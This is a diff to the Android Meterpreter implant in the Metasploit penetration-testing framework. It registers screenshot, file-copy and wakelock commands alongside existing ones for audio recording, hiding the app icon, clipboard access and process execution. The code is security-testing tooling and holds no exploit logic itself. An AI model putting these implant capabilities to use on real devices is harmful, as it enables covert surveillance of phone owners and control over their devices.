@@ -6,6 +6,7 @@ import android.os.Looper;
 
 import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.android.*;
+import com.metasploit.meterpreter.android.stdapi_ui_desktop_screenshot;
 import com.metasploit.meterpreter.stdapi.*;
 
 import java.io.DataInputStream;
@@ -110,6 +111,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_fs_delete_file", stdapi_fs_delete_file.class);
         mgr.registerCommand("stdapi_fs_file_expand_path", stdapi_fs_file_expand_path_android.class);
         mgr.registerCommand("stdapi_fs_file_move", stdapi_fs_file_move.class);
+        mgr.registerCommand("stdapi_fs_file_copy", stdapi_fs_file_copy.class);
         mgr.registerCommand("stdapi_fs_getwd", stdapi_fs_getwd.class);
         mgr.registerCommand("stdapi_fs_ls", stdapi_fs_ls.class);
         mgr.registerCommand("stdapi_fs_mkdir", stdapi_fs_mkdir.class);
@@ -126,6 +128,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_sys_config_localtime", stdapi_sys_config_localtime.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
+        mgr.registerCommand("stdapi_ui_desktop_screenshot", stdapi_ui_desktop_screenshot.class);
         if (context != null) {
             mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
             mgr.registerCommand("webcam_list", webcam_list_android.class);
@@ -144,6 +147,7 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("android_hide_app_icon", android_hide_app_icon.class);
             mgr.registerCommand("android_set_audio_mode", android_set_audio_mode.class);
             mgr.registerCommand("android_sqlite_query", android_sqlite_query.class);
+            mgr.registerCommand("android_wakelock", android_wakelock.class);
             mgr.registerCommand("android_set_wallpaper", android_set_wallpaper.class);
             mgr.registerCommand("extapi_clipboard_get_data", clipboard_get_data.class);
             mgr.registerCommand("extapi_clipboard_set_data", clipboard_set_data.class);
